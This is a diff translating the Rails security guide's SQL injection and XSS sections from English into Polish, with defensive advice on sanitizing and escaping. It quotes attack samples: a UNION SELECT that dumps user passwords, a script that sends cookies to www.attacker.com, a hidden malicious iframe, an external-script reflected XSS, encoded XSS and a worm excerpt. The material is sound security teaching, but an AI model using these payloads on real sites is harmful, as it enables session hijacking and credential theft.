 <pre><tt>') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --</tt></pre>
 </div></div>
-<div class="paragraph"><p>This will result in the following SQL query:</p></div>
+<div class="paragraph"><p>W rezultacie otrzymamy następujące zapytanie SQL:</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>SELECT * FROM projects WHERE (name = '') UNION
   SELECT id,login AS name,password AS description,1,1,1 FROM users --')</tt></pre>
 </div></div>
-<div class="paragraph"><p>The result won&#8217;t be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That&#8217;s why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.</p></div>
-<div class="paragraph"><p>Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails <a href="http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/">to at least 2.1.1</a>.</p></div>
-<h4 id="_countermeasures_2">8.2.4. Countermeasures</h4>
-<div class="paragraph"><p>Ruby on Rails has a built in filter for special SQL characters, which will escape ' , " , NULL character and line breaks. <span style="background-color: #fffcdb;">Using Model.find(id) or Model.find_by_some thing(something) automatically applies this countermeasure[,#fffcdb]</span>. But in SQL fragments, especially <span style="background-color: #fffcdb;">in conditions fragments (:conditions =&gt; "..."), the connection.execute() or Model.find_by_sql() methods, it has to be applied manually</span>.</p></div>
-<div class="paragraph"><p>Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:</p></div>
+<div class="paragraph"><p>Rezultatem nie będzie lista projektów (ponieważ nie ma projektu z pustym polem nazwy), tylko lista nazw użytkowników i ich hasła. Więc miejmy nadzieję, że zaszyfrowałeś hasła w bazie danych! Jedynym problemem dla atakującego jest to, że liczba kolumn musi być taka sama w obu zapytaniach. Dlatego drugie zapytanie zawiera listę jedynek (1), która zawsze będzie mieć wartość 1, w celu dopasowania liczby kolumn w pierwszym zapytaniu.</p></div>
+<div class="paragraph"><p>Również drugie zapytanie zmienia nazwy niektórych kolumn korzystając z AS tak aby aplikacja internetowa wyświetlała wartości z tabeli użytkowników. Pamiętaj, aby zaktualizować Railsy <a href="http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/">przynajmniej do wersji 2.1.1</a>.</p></div>
+<h4 id="_sposoby_ochrony_2">7.2.4. Sposoby ochrony</h4>
+<div class="paragraph"><p>Ruby on Rails jest wyposażone w specjalny filtr dla znaków SQL, do których należą znaki ucieczki ' , " , znak NULL i podziały wiersza. <span style="background-color: #Fffcdb;">Korzystając z Model.find(id) lub Model.find_by_something(coś) automatycznie stosujesz ochronę</span>. Ale fragmenty SQL, szczególnie <span style="background-color: #fffcdb;">fragmenty w conditions (:conditions =&gt; "..."), metody connection.execute() lub Model.find_by_sql() muszą być stosowane ręcznie</span>.</p></div>
+<div class="paragraph"><p>Zamiast przekazywania ciągu do opcji conditions, możesz przekazać tablicę do oczyszczenia zanieczyszczonego ciągu znaków w taki sposób:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
 http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt>Model<span style="color: #990000">.</span>find<span style="color: #990000">(:</span>first<span style="color: #990000">,</span> <span style="color: #990000">:</span>conditions <span style="color: #990000">=&gt;</span> <span style="color: #990000">[</span><span style="color: #FF0000">"login = ? AND password = ?"</span><span style="color: #990000">,</span> entered_user_name<span style="color: #990000">,</span> entered_password<span style="color: #990000">])</span></tt></pre></div></div>
-<div class="paragraph"><p>As you can see, the first part of the array is an SQL fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result:</p></div>
+<div class="paragraph"><p>Jak widać, pierwsza część tablicy jest fragmentem SQL ze znakami zapytania. W oczyszczonej wersji zmienne w drugiej części tablicy zastąpiły znaki zapytania. To samo można zrobić z hashem:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
 http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt>Model<span style="color: #990000">.</span>find<span style="color: #990000">(:</span>first<span style="color: #990000">,</span> <span style="color: #990000">:</span>conditions <span style="color: #990000">=&gt;</span> <span style="color: #FF0000">{</span><span style="color: #990000">:</span>login <span style="color: #990000">=&gt;</span> entered_user_name<span style="color: #990000">,</span> <span style="color: #990000">:</span>password <span style="color: #990000">=&gt;</span> entered_password<span style="color: #FF0000">}</span><span style="color: #990000">)</span></tt></pre></div></div>
-<div class="paragraph"><p>The array or hash form is only available in model instances. You can try <tt>sanitize_sql()</tt> elsewhere. <span style="background-color: #fffcdb;">Make it a habit to think about the security consequences when using an external string in SQL</span>.</p></div>
-<h3 id="_cross_site_scripting_xss">8.3. Cross-Site Scripting (XSS)</h3>
-<div class="paragraph"><p>-- <em>The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off.</em></p></div>
-<h4 id="_entry_points">8.3.1. Entry points</h4>
-<div class="paragraph"><p>An entry point is a vulnerable URL and its parameters where an attacker can start an attack.</p></div>
-<div class="paragraph"><p>The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter – obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the <a href="http://livehttpheaders.mozdev.org/">Live HTTP Headers Firefox plugin</a>, or client-site proxies make it easy to change requests.</p></div>
-<div class="paragraph"><p>XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session; redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.</p></div>
-<div class="paragraph"><p>During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The <a href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf">Symantec Global Internet Security threat report</a> also documented 239 browser plug-in vulnerabilities in the last six months of 2007. <a href="http://pandalabs.pandasecurity.com/archive/MPack-uncovered_2100_.aspx">Mpack</a> is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites <a href="http://www.0x000000.com/?i=556">were hacked</a> like this, among them the British government, United Nations and many more high targets.</p></div>
-<div class="paragraph"><p>A relatively new, and unusual, form of entry points are banner advertisements. In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to <a href="http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/">Trend Micro</a>.</p></div>
-<h4 id="_html_javascript_injection">8.3.2. HTML/JavaScript Injection</h4>
-<div class="paragraph"><p>The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. <span style="background-color: #fffcdb;">Escaping user input is essential</span>.</p></div>
-<div class="paragraph"><p>Here is the most straightforward test to check for XSS:</p></div>
+<div class="paragraph"><p>Tablica lub formularz hasha jest dostępny tylko w instancjach modelu. Możesz spróbować <tt>sanitize_sql()</tt> gdzie indziej. <span style="background-color: #fffcdb;">Nabierz nawyku myślenia o konsekwencjach dla bezpieczeństwa gdy korzystasz z zewnętrznego ciągu znaków w SQL</span>.</p></div>
+<h3 id="_atak_cross_site_scripting_xss">7.3. Atak Cross-Site Scripting (XSS)</h3>
+<div class="ulist"><ul>
+<li>
+<p>
+<em>Najbardziej rozpowszechnionym i zarazem jednym z najbardziej niszczycielski dla aplikacji internetowych jest atak typu XSS. Ten złośliwy atak wprowadza wykonywalny kod po stronie klienta. Railsy dostarczają helpery, żeby się przed nim bronić.</em>
+</p>
+</li>
+</ul></div>
+<h4 id="_punkty_wej_cia">7.3.1. Punkty wejścia</h4>
+<div class="paragraph"><p>Punkt wejścia jest to podatny URL i jego parametry, gdzie atakujący może rozpocząć atak.</p></div>
+<div class="paragraph"><p>Najczęstszymi punktami wejścia są posty, komentarze użytkowników i księgi gości, ale tytuły projektów, nazwy dokumentów i strony z wynikami wyszukiwania również są narażone - niemal wszystkie miejsca, w których użytkownik może wprowadzać dane. Ale wejście nie musi pochodzić z pól wejścia na stronach internetowych. Może być to jakikolwiek parametr URL - nawet, ukryty lub wewnętrzny. Pamiętaj, że użytkownik może przechwycić jakikolwiek ruch. Aplikacje, takie jak <a href="http://livehttpheaders.mozdev.org/">wtyczka Live HTTP Headers Firefox</a> lub Proxy po stronie klienta ułatwiają zmianę żądania.</p></div>
+<div class="paragraph"><p>Ataki XSS działają w taki sposób: Atakujący wprowadza jakiś kod, aplikacja internetowa zapisuje go i wyświetla na stronie, a później przedstawia ofiarze. Większość przykładów XSS prostu wyświetla okno ostrzegawcze (alert box), ale jest to dużo bardziej groźne. XSS może wykraść cookies, przechwytywać sesje; przekierowywać ofiary do fałszywej strony internetowej, wyświetlać reklamy na korzyść atakującego, zmieniać elementy na stronie internetowej, aby uzyskać poufne informacje lub instalować złośliwe oprogramowanie poprzez luki w przeglądarce internetowej.</p></div>
+<div class="paragraph"><p>W drugiej połowie 2007 r. było 88 zgłoszonych usterek w Mozilli, 22 w Safari, 18 w IE, a 12 w Operze. W <a href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf">sprawozdaniu Symantec Internet Security Globalne</a> także udokumentowano 239 usterek we wtyczkach do przeglądarek w ciągu ostatnich sześciu miesięcy 2007 roku. <a href="http://pandalabs.pandasecurity.com/archive/MPack-uncovered_2100_.aspx">http://pandalabs.pandasecurity.com/archive/MPack-uncovered_2100_.aspx</a> [MPack] jest bardzo aktywnym i aktualnym frameworkiem ataku , który wykorzystuje te luki. Dla hakerów, wizja wykorzystania luk podatnych na ataki typu SQL Injection we frameworkach aplikacji internetowych i wprowadzenie złośliwego kodu w każdej kolumnie tabel tekstowych jest bardzo kuszące. W kwietniu 2008 ponad 510.000 stron <a href="http://www.0x000000.com/?i=556">http://www.0x000000.com/?i=556</a> [były zhakowane] jak tak. Wśród nich znalazły się strony brytyjskiego rządu, ONZ i wiele innych poważnych celów.</p></div>
+<div class="paragraph"><p>Stosunkowo nowymi i niecodziennymi formami punktów wejścia są banery reklamowe. We wcześniejszych miesiącach 2008 roku, złośliwy kod ukazał się w reklamach w formie baneru na popularnych witrynach, takich jak MySpace i Excite, zgodnie z <a href="http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/">Trend Micro</a>.</p></div>
+<h4 id="_ataki_html_javascript_injection">7.3.2. Ataki HTML/JavaScript Injection</h4>
+<div class="paragraph"><p>Najczęściej stosowanym językiem dla XSS jest oczywiście najbardziej popularny język wykonywany po stronie klienta - JavaScript, często w połączeniu z HTML. <span style="background-color: #fffcdb;">Unikanie wejścia użytkownika jest niezbędne</span>.</p></div>
+<div class="paragraph"><p>Oto najprostszy test, aby sprawdzić XSS:</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>&lt;script&gt;alert('Hello');&lt;/script&gt;</tt></pre>
 </div></div>
-<div class="paragraph"><p>This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:</p></div>
+<div class="paragraph"><p>Ten kod JavaScript po prostu wyświetli alert box. Kolejne przykłady robią dokładnie to samo, tylko w bardzo nietypowych miejscach:</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>&lt;img src=javascript:alert('Hello')&gt;
 &lt;table background="javascript:alert('Hello')"&gt;</tt></pre>
 </div></div>
-<h5 id="_cookie_theft">Cookie theft</h5>
-<div class="paragraph"><p>These examples don&#8217;t do any harm so far, so let&#8217;s see how an attacker can steal the user&#8217;s cookie (and thus hijack the user&#8217;s session). In JavaScript you can use the document.cookie property to read and write the document&#8217;s cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:</p></div>
+<h5 id="_kradzie_cookie">Kradzież cookie</h5>
+<div class="paragraph"><p>Te przykłady, jak na razie nie robią żadnej szkody, więc zobaczmy w jaki sposób atakujący może wykraść cookies użytkownika (i tym samym przejąć sesję użytkownika). W JavaScript można użyć właściwość document.cookie do odczytu i zapisu cookies. JavaScript egzekwuje the same origin policy, co oznacza, że skrypt z jednej domeny nie może uzyskać dostępu do cookies z innej domeny. We właściwości document.cookie posiada cookie pochodzące z serwera WWW. Jednakże, możesz odczytywać i zapisywać tą wartość, jeśli umieścisz kod bezpośrednio w dokumencie HTML (jak to się dzieje w XSS). Umieść to gdziekolwiek na swojej stronie w celu sprawdzenia własnych cookies na stronie wyników:</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>&lt;script&gt;document.write(document.cookie);&lt;/script&gt;</tt></pre>
 </div></div>
-<div class="paragraph"><p>For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL <a href="http://www.attacker.com/">http://www.attacker.com/</a> plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server&#8217;s access log files to see the victims cookie.</p></div>
+<div class="paragraph"><p>Dla atakujący, oczywiście, nie jest to przydatne, ponieważ ofiara zobaczy swoje własne cookie. W następnym przykładzie spróbujemy załadować obrazek z adresu <a href="http://www.attacker.com/">http://www.attacker.com/</a> plus cookie. Oczywiście ten adres nie istnieje, więc przeglądarka nic nie wyświetli. Ale atakujący może dokonać przeglądu raportu dostępu do jego serwera, żeby sprawdzić cookie ofiar.</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>&lt;script&gt;document.write('&lt;img src="http://www.attacker.com/' + document.cookie + '"&gt;');&lt;/script&gt;</tt></pre>
 </div></div>
-<div class="paragraph"><p>The log files on www.attacker.com will read like this:</p></div>
+<div class="paragraph"><p>Raprt na www.attacker.com będzie wyglądać tak:</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2</tt></pre>
 </div></div>
-<div class="paragraph"><p>You can mitigate these attacks (in the obvious way) by adding the <a href="http://dev.rubyonrails.org/ticket/8895">httpOnly</a> flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies <a href="http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/">will still be visible using Ajax</a>, though.</p></div>
-<h5 id="_defacement">Defacement</h5>
-<div class="paragraph"><p>With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:</p></div>
+<div class="paragraph"><p>Możesz zmniejszyć te ataki (w sposób oczywisty) poprzez dodanie flagi <a href="http://dev.rubyonrails.org/ticket/8895">http://dev.rubyonrails.org/ticket/8895</a> [httpOnly] cookies, żeby document.cookie nie mógł być odczytany przez JavaScript. Cookies httpOnly mogą być używane pod IE v6.SP1, Firefoxoxem v2.0.0.5 i Operą 9.5. Safari nadal ignoruje tą opcję. Ale w innych, starszych przeglądarkach (np. WebTV i IE 5.5 na Macu) może to powodować problemy z ładowaniem się stron. Ostrzegamy, że pliki cookie <a href="http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/">nadal będą widoczne przy użyciu technologii Ajax</a>.</p></div>
+<h5 id="_atak_typu_defacement">Atak typu Defacement</h5>
+<div class="paragraph"><p>Poprzez atak typu defacment atakujący może zrobić wiele rzeczy, na przykład przedstawiać fałszywe informacje lub wabić ofiary na swoją stronę internetową, żeby wykraść cookies, dane logowania lub innych wrażliwe dane. Najbardziej popularnym sposobem jest wstawienie kodu z zewnętrznych źródeł przez iframes:</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>&lt;iframe name=”StatPage” src="http://58.xx.xxx.xxx" width=5 height=5 style=”display:none”&gt;&lt;/iframe&gt;</tt></pre>
 </div></div>
-<div class="paragraph"><p>This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iFrame is taken from an <a href="http://www.symantec.com/enterprise/security_response/weblog/2007/06/italy_under_attack_mpack_gang.html">actual attack</a> on legitimate Italian sites using the <a href="http://isc.sans.org/diary.html?storyid=3015">Mpack attack framework</a>. Mpack tries to install malicious software through security holes in the web browser – very successfully, 50% of the attacks succeed.</p></div>
-<div class="paragraph"><p>A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site&#8217;s original, but transmits the user name and password to the attackers site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.</p></div>
-<div class="paragraph"><p>Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":</p></div>
+<div class="paragraph"><p>Powyższy kod załaduje arbitralny kod HTML i/lub JavaScript z zewnętrznego źródła i osadzi go jako część witryny. Ten IFrame pochodzi z  <a href="http://www.symantec.com/enterprise/security_response/weblog/2007/06/italy_under_attack_mpack_gang.html">rzeczywistego ataku</a> prawnych Włoskich stron przy użyciu <a href="http://isc.sans.org/diary.html?storyid=3015">frameworku ataku MPack</a>. MPack próbuje zainstalować złośliwe oprogramowanie poprzez luki w przeglądarce internetowej - jest bardzo skuteczny, 50% ataków kończy się sukcesem.</p></div>
+<div class="paragraph"><p>Bardziej specjalistyczne ataki mogą pokrywać całą stronę internetową lub wyświetlać formularz logowania, który wygląda tak samo jak oryginalny, lecz przekazuje nazwę użytkownika i hasło na stronę atakującego. Może też używać CSS i/lub JavaScript do ukrycia ważnych linków w aplikacji internetowej i wyświetlać inne, który przekierowywują do fałszywej strony internetowej.</p></div>
+<div class="paragraph"><p>Odbite ataki typu injection to te, w których ładunek nie jest trzymany do przedstawienia go ofiarze później, ale zawarty w adresie URL. Zwłaszcza formularze wyszukiwania nie mogą uniknąć wyszukiwania ciągu znaków. Następujący link przedstawiła stronę, która stwierdziła, że "George Bush powołał 9-letniego chłopca na przewodniczącego ...":</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--&gt;
   &lt;script src=http://www.securitylab.ru/test/sc.js&gt;&lt;/script&gt;&lt;!--</tt></pre>
 </div></div>
-<h5 id="_countermeasures_3">Countermeasures</h5>
-<div class="paragraph"><p><span style="background-color: #fffcdb;">It is very important to filter malicious input, but it is also important to escape the output of the web application</span>.</p></div>
-<div class="paragraph"><p>Especially for XSS, it is important to do <span style="background-color: #fffcdb;">whitelist input filtering instead of blacklist</span>. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.</p></div>
-<div class="paragraph"><p>Imagine a blacklist deletes “script” from the user input. Now the attacker injects “&lt;scrscriptipt&gt;”, and after the filter, “&lt;script&gt;” remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:</p></div>
+<h5 id="_sposoby_ochrony_3">Sposoby ochrony</h5>
+<div class="paragraph"><p><span style="background-color: #fffcdb;">Bardzo ważne jest filtrowanie złośliwego wejścia, ale równie ważne jest uniknięcie wyjście w aplikacjach internetowych</span>.</p></div>
+<div class="paragraph"><p>W szczególności dla XSS, ważne jest, aby zrobić <span style="background-color: #fffcdb;">białą listę filtrowania wejścia zamiast czarnej</span>. Biała lista filtrowania określa dozwolone wartości w przeciwieństwie do wartości niedozwolonych. Czarne listy nigdy nie są kompletne.</p></div>
+<div class="paragraph"><p>Wyobraź sobie, że czarna lista usuwa "skrypt" z wejścia użytkownika. Teraz atakujący wprowadza "&lt;scrscriptipt&gt;", a po przefiltrowaniu pozostaje "&lt;script&gt;". Wcześniejsze wersje Railsów używały czarnej listy do metod strip_tags(), strip_links() i sanitize(). Więc tego typu atak był możliwy:</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>strip_tags("some&lt;&lt;b&gt;script&gt;alert('hello')&lt;&lt;/b&gt;/script&gt;")</tt></pre>
 </div></div>
-<div class="paragraph"><p>This returned "some&lt;script&gt;alert(<em>hello</em>)&lt;/script&gt;", which makes an attack work. That&#8217;s why I vote for a whitelist approach, using the updated Rails 2 method sanitize():</p></div>
+<div class="paragraph"><p>Zwróciło to "some&lt;script&gt;alert(<em>hello</em>)&lt;/script&gt;", co sprawiło, że atak zadziałał. To jest powód dla którego byłem za wprowadzeniem białych list przy aktualizacji metody sanitize() w Railsach 2.</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
 s = sanitize(user_input, :tags =&gt; tags, :attributes =&gt; %w(href title))</tt></pre>
 </div></div>
-<div class="paragraph"><p>This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.</p></div>
-<div class="paragraph"><p>As a second step, <span style="background-color: #fffcdb;">it is good practice to escape all output of the application</span>, especially when re-displaying user input, which hasn&#8217;t been input filtered (as in the search form example earlier on). <span style="background-color: #fffcdb;">Use escapeHTML() (or its alias h()) method</span> to replace the HTML input characters &amp;,",&lt;,&gt; by its uninterpreted representations in HTML (&amp;, &quot;, &lt; and &gt;). However, it can easily happen that the programmer forgets to use it, so <span style="background-color: #fffcdb;">it is recommended to use the <a href="http://safe-erb.rubyforge.org/svn/plugins/safe_erb/">SafeErb</a> plugin</span>. SafeErb reminds you to escape strings from external sources.</p></div>
-<h5 id="_obfuscation_and_encoding_injection">Obfuscation and Encoding Injection</h5>
-<div class="paragraph"><p>Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:</p></div>
+<div class="paragraph"><p>Pozwala to tylko na używanie niektórych tagów i odwala dobrą robotę, nawet przeciw wszelkiego rodzaju sztuczkom i zniekształconym tagom.</p></div>
+<div class="paragraph"><p>W drugim etapie, <span style="background-color: #fffcdb;">dobrą praktyką jest unikanie wszystkich wyjść aplikacji</span>, zwłaszcza gdy ponownie wyświetlane jest wejście użytkownika, które nie zostało przefiltrowane (jak we wcześniej wspomnianym przykładzie formularza wyszukiwania). <span style="background-color: #fffcdb;">Używaj metody escapeHTML() (lub jej aliasu h())</span> żeby zastąpić znaki wejścia HTML &amp;,",&lt;,&gt; przez ich nieinterpretowane reprezentacje w formacie HTML (&amp;, &quot;, &lt; and &gt;). Jednak może się zdarzyć, że programatora zapomni ich użyć, więc <span style="background-color: #fffcdb;">zaleca się korzystanie z <a href="http://safe-erb.rubyforge.org/svn/plugins/safe_erb/">wtyczki SafeErb</a></span>. SafeErb przypomina o unikaniu ciągów znaków z zewnętrznych źródeł.</p></div>
+<h5 id="_zaciemnianie_i_ataki_z_wykorzystaniem_kodowania_znak_w">Zaciemnianie i ataki z wykorzystaniem kodowania znaków</h5>
+<div class="paragraph"><p>Ruch w sieci opiera się głównie na ograniczonym zachodnim alfabecie, więc nowe kodowanie znaków, np. Unicode, pojawiły się, w celu przekazywania znaków w innych językach. Ale jest to również zagrożenie dla aplikacji internetowych, ponieważ złośliwy kod może być ukryty w różnych kodowaniach, z którymi przeglądarka internetowa może sobie poradzić, a aplikacja internetowa nie może. Oto wektor ataku w kodowaniu UTF-8:</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;
   &amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</tt></pre>
 </div></div>
-<div class="paragraph"><p>This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus “get to know your enemy”, is the <a href="http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php">Hackvertor</a>. Rails‘ sanitize() method does a good job to fend off encoding attacks.</p></div>
-<h4 id="_examples_from_the_underground">8.3.3. Examples from the underground</h4>
-<div class="paragraph"><p>-- <em>In order to understand today&#8217;s attacks on web applications, it&#8217;s best to take a look at some real-world attack vectors.</em></p></div>
-<div class="paragraph"><p>The following is an excerpt from the <a href="http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&amp;tabid=1">Js.Yamanner@m</a> Yahoo! Mail <a href="http://groovin.net/stuff/yammer.txt">worm</a>. It appeared on June 11, 2006 and was the first webmail interface worm:</p></div>
+<div class="paragraph"><p>Działaniem tego przykładu jest wyskakujące okno komunikatu. Będzie to rozpoznawane przez wyżej wspomniany filtr sanitize(). Świetnym narzędziem do zaciemniania i kodowania ciągów znaków, a tym samym "do poznania swjego wroga", jest <a href="http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php">http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php</a> [Hackvertor]. Railsowa metoda sanitize() odwala dobrą robotę odpierając ataki z wykorzystaniem kodowania znaków.</p></div>
+<h4 id="_podziemne_przyk_ady">7.3.3. Podziemne przykłady</h4>
+<div class="paragraph"><p>-- <em> Aby zrozumieć dzisiejsze ataki na aplikacje internetowe, najlepiej spojrzeć na niektóre wektory ataków w świecie rzeczywistym.</em></p></div>
+<div class="paragraph"><p>Poniżej znajduje się wyciąg z <a href="http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&amp;tabid=1">Js.Yamanner@m</a> Yahoo! Mail <a href="http://groovin.net/stuff/yammer.txt">worm</a>. Ukazał się 11 czerwca 2006 roku i był pierwszym robakiem w mailowym interfejsie:</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>&lt;img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
   target=""onload="var http_request = false;    var Email = '';
   var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...</tt></pre>
 </div></div>
-<div class="paragraph"><p>The worms exploits a hole in Yahoo&#8217;s HTML/JavaScript filter, it usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.</p></div>
-<div class="paragraph"><p>Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details and a video demonstration on <a href="http://rosario.valotta.googlepages.com/home">Rosario Valotta&#8217;s website</a>. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.</p></div>
-<div class="paragraph"><p>In December 2006, 34,000 actual user names and passwords were stolen in a <a href="http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html">MySpace phishing attack</a>. The idea of the attack was to create a profile page named “login_home_index_html”, so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.</p></div>
-<div class="paragraph"><p>The MySpace Samy worm will be discussed in the CSS Injection section.</p></div>
-<h3 id="_css_injection">8.4. CSS Injection</h3>
+<div class="paragraph"><p>Robak wykorzystuje dziurę w filtrze HTML/JavaScript Yahoo. Zazwyczaj filtruje on wszystkie cele i atrybuty onload z tagów (ponieważ nie można używać JavaScriptu). Filtr jest stosowany tylko raz, jednak w taki sposób, że atrybuty onload z zainfekowanym kodem pozostają w miejscu. Jest to dobry przykład tego, że filtry tworzone za pomocą czarnych list nigdy nie są kompletne i dlaczego trudno jest pozwolić na HTML/JavaScript w aplikacji internetowej.</p></div>
+<div class="paragraph"><p>Kolejnym dowodem koncepcji robaka webmailowego jest Nduja, robak typu cross-domain na cztery włoskie usługi webmailowe. Więcej szczegółów i demonstracja wideo znajduje się na stronie <a href="http://rosario.valotta.googlepages.com/home">http://rosario.valotta.googlepages.com/home</a> [Rosario Valotta]. Oba webmailowe robaki mają na celu zbieranie adresów e-mail, czyli coś, za co haker może zarobić duże pieniądze.</p></div>
+<div class="paragraph"><p>W grudniu 2006 roku, 34000 rzeczywistych nazw użytkownika i haseł zostały skradzione z <a href="http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html">http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html</a> [MySpace poprzez atak typu phishing]. Ideą ataku było stworzenie strony profilu o nazwie "login_home_index_html", a więc adres wyglądał bardzo przekonująco. Specjalnie spreparowany HTML i CSS został użyty w celu ukrycia prawdziwej treści ze strony MySpace i zamiast tego wyświetlał własny formularz logowania.</p></div>
+<div class="paragraph"><p>Robak Samy z MySpace zostanie omówiony w sekcji o atakach typu CSS injection.</p></div>
+<h3 id="_css_injection">7.4. CSS Injection</h3>
 <div class="paragraph"><p>-- <em>CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application.</em></p></div>
 <div class="paragraph"><p>CSS Injection is explained best by a well-known worm, the <a href="http://namb.la/popular/tech.html">MySpace Samy worm</a>. This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline. The following is a technical explanation of the worm.</p></div>
